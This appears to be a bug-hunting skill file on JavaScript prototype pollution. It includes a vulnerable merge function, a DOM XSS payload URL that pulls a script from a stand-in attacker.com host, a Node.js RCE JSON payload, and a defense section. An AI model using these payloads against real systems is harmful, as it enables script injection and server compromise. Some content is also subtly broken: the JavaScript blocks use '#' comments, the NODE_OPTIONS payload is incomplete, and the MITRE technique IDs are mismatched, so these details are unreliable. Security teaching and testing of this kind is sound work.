---
name: javascript-prototype-pollution
description: >
  Identify and exploit Prototype Pollution vulnerabilities in JavaScript applications to achieve 
  client-side Cross-Site Scripting (XSS), bypass authentication, or execute Remote Code Execution (RCE) 
  on Node.js servers by manipulating the core Object prototype.
domain: cybersecurity
subdomain: bug-hunting
category: Web Vulnerabilities
difficulty: advanced
estimated_time: "2-4 hours"
mitre_attack:
  tactics: [TA0008, TA0004]
  techniques: [T1188, T1190]
platforms: [web, nodejs]
tags: [javascript, prototype-pollution, xss, rce, bug-hunting, nodejs, web-security]
tools: [burp-suite, chrome-devtools, nodejs]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# JavaScript Prototype Pollution

## When to Use
- When auditing JavaScript-heavy applications (both client-side SPA or server-side Node.js) that perform complex object assignments, deep merges, or cloning (e.g., using libraries like Lodash, jQuery, or custom merge functions).
- To escalate seemingly unexploitable logic bugs into severe vulnerabilities like DOM XSS on the client or RCE on the backend server.
- When an application parses JSON or URL query streams directly into objects without properly sanitizing highly sensitive keys like `__proto__`.


## Prerequisites
- Authorized scope and target URLs from bug bounty program
- Burp Suite Professional (or Community) configured with browser proxy
- Familiarity with OWASP Top 10 and common web vulnerability classes
- SecLists wordlists for fuzzing and enumeration

## Workflow

### Phase 1: Understanding Prototype Pollution (The Concept)

```javascript
# Concept: In JavaScript, almost everything is an Object. Objects inherit properties from their `prototype`.
# The root prototype is accessible via the magical `__proto__` property (or `constructor.prototype`).
# If an attacker can inject properties into `Object.prototype`, those properties will be inherited globally
# by ALL objects in the application that do not explicitly define that property.

# Harmless object creation:
let myObj = {}; 
console.log(myObj.isAdmin); // undefined

# The Pollution:
Object.prototype.isAdmin = true;

# The Impact:
let newObj = {};
console.log(newObj.isAdmin); // true! (The application is globally polluted)
```

### Phase 2: Identifying Injection Sinks

```javascript
# Look for vulnerable patterns in the source code where user input is recursively merged into existing objects.
# Common vulnerable functions: `merge()`, `clone()`, `extend()`, `update()`.

# Example of a vulnerable recursive merge function:
function merge(target, source) {
    for (let key in source) {
        if (typeof source[key] === 'object' && typeof target[key] === 'object') {
            merge(target[key], source[key]);
        } else {
            target[key] = source[key]; // <--- THE FLAW: It allows key === '__proto__'
        }
    }
    return target;
}
```

### Phase 3: Client-Side Exploitation (DOM XSS)

```javascript
# Concept: Find a "gadget" – a piece of legitimate application code that behaves dangerously 
# if a specific undefined property is suddenly defined via prototype pollution.

# Gadget Example in application code:
# let config = { timeout: 5000 };
# if (config.scriptSrc) {
#    let script = document.createElement('script');
#    script.src = config.scriptSrc; // Executes external script!
#    document.body.appendChild(script);
# }

# 1. Payload Creation: URL Parameter Injection
# Send a link to the victim: 
# https://target.com/?__proto__[scriptSrc]=https://attacker.com/evil.js

# 2. Execution:
# When the app parses the URL and runs the vulnerable `merge` function, `config.scriptSrc` inherits 
# the malicious URL, resulting in DOM-based XSS.
```

### Phase 4: Server-Side Exploitation (Node.js RCE)

```bash
# Concept: If the Node.js backend merges attacker-controlled JSON, we can pollute the server's global prototype.
# Node.js process execution functions (like `child_process.spawn` or `exec`) use configuration objects
# that check for specific properties (e.g., `shell`, `env`). If these are undefined by the developer,
# they can be inherited from the polluted prototype resulting in RCE.

# 1. JSON Payload sent via API (e.g., POST /api/updateProfile)
{
    "user_id": 1234,
    "__proto__": {
        "env": {
            "NODE_OPTIONS": "--require /proc/self/environ"
        },
        "shell": true
    }
}

# 2. The Gadget in the Backend Code
# const { exec } = require('child_process');
# exec('ping 8.8.8.8', {}); // Inherits the polluted 'env' and 'shell', causing Environment Injection!
```

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Identify Object Merge/Clone operations processing user input] --> B[Test for Pollution by injecting `__proto__[test]=1`]
    B --> C{Check `Object.prototype.test`}
    C -->|Equals 1| D[Prototype Pollution Confirmed!]
    C -->|Undefined| E[Filter in place or not vulnerable. Try bypassing with `constructor[prototype][test]=1`]
    D --> F{Is it Client-side or Server-side?}
    F -->|Client-side| G[Search JavaScript for DOM XSS Gadgets (e.g. innerHTML, default script sources)]
    F -->|Server-side| H[Search for Node.js RCE Gadgets (child_process, template engine compilation)]
    G --> I[Execute Stored/Reflected DOM XSS]
    H --> J[Gain Backend Remote Code Execution]
```


## 🔵 Blue Team Detection & Defense
- **Safe Object Assignment**: The most robust defense is to never parse user input into object keys blindly. Use `Map` objects instead of standard objects for storing arbitrary key-value pairs assigned by users. Alternatively, instantiate objects without a prototype using `Object.create(null)` before utilizing them as generic dictionaries.
- **Input Validation & Sanitization**: Explicitly filter out keys like `__proto__`, `constructor`, and `prototype` in any function that recursively assigns or merges object properties. Implementing strict schema validation (using tools like Zod or Joi) on all incoming JSON payloads natively mitigates this by rejecting unexpected keys.
- **Software Composition Analysis (SCA)**: Modern libraries have largely patched these vulnerabilities. Routinely run tools like `npm audit` and update utility libraries (e.g., Lodash, jQuery) to versions that explicitly mitigate recursive prototype assignment.

## Key Concepts
| Concept | Description |
|---------|-------------|
| Prototype | The fundamental inheritance model in JavaScript where objects inherit methods and properties from a parent prototype object dynamically |
| `__proto__` | A magical accessor property that points directly to the object's parent prototype, enabling dynamic manipulation |
| Gadget | Existing, legitimate application code that performs a dangerous action (like executing a script) only when an unexpected variable is initialized via global prototype pollution |


## Output Format
```
Javascript Prototype Pollution — Assessment Report
============================================================
Target: [Target identifier]
Assessor: [Operator name]
Date: [Assessment date]
Scope: [Authorized scope]
MITRE ATT&CK: [Relevant technique IDs]

Findings Summary:
  [Finding 1]: [Severity] — [Brief description]
  [Finding 2]: [Severity] — [Brief description]

Detailed Results:
  Phase 1: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

  Phase 2: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

Risk Rating: [Critical/High/Medium/Low/Informational]
Recommendations:
  1. [Immediate remediation step]
  2. [Long-term hardening measure]
  3. [Monitoring/detection improvement]
```


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- PortSwigger: [Prototype Pollution](https://portswigger.net/web-security/prototype-pollution)
- OWASP: [Prototype Pollution Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html)
- Node.js Security Working Group: [Prototype Pollution in Node.js](https://nodejs.org/en/blog/vulnerability/february-2023-security-releases)
